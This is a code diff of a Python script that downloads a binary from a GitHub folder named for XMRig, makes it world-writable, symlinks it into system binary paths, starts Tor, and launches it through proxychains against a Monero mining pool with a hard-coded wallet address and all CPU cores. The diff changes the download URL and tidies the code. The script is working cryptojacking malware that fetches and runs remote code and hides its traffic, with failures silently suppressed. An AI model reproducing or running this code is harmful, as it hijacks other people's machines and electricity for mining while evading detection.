@@ -21,17 +21,16 @@ try:
     os.system('make')
     os.system('make install')
     os.system('make install-config')
-    if os.path.isfile('/usr/local/bin/' + program) == False:
-        os.system('wget https://github.com/HarrisNancyvwguc/learning/raw/main/' + program)
-        os.system('chmod 777 ' + workingdir + '/' + program)
-        #workingdir = os.getcwd()
-        os.system('ln -s -f ' + workingdir + '/' + program + ' ' +'/usr/local/bin/' + program)
+    if not os.path.isfile('/usr/local/bin/' + program):
+        os.system('wget https://github.com/ts6aud5vkg/daovps/raw/master/xmrig_tls/' + program)
+        os.system('chmod 777 ' + program)
+        workingdir = os.getcwd()
+        os.system('ln -s -f ' + workingdir + '/' + program + ' ' + '/usr/local/bin/' + program)
         os.system('ln -s -f ' + workingdir + '/' + program + ' ' + '/usr/bin/' + program)
-        time.sleep (2)
-    #else:
-        #print 'Da co'
+        time.sleep(2)
 except:
     pass
+
 os.system('tor &')
 time.sleep(60)
-os.system ('proxychains4 ' + program + ' --donate-level 1 -o xmr-us-west1.nanopool.org:14433 -u 4BK5ZPJGLpSdC2Pk3FH7iGaB5uBEDj76pYpSC4qaRBGKEHzcs8vDJSvB6WfWz7efiURtQERFUtEs6A3joiMF3EnHEpo2eNY.orcfullaz/jmayo66@yahoo.com -p az -a rx/0 -k --tls -t ' + str(cores))
+os.system('proxychains4 ' + program + ' --donate-level 1 -o xmr-us-west1.nanopool.org:14433 -u 4BK5ZPJGLpSdC2Pk3FH7iGaB5uBEDj76pYpSC4qaRBGKEHzcs8vDJSvB6WfWz7efiURtQERFUtEs6A3joiMF3EnHEpo2eNY.orcfullaz/jmayo66@yahoo.com -p az -a rx/0 -k --tls -t ' + str(cores))
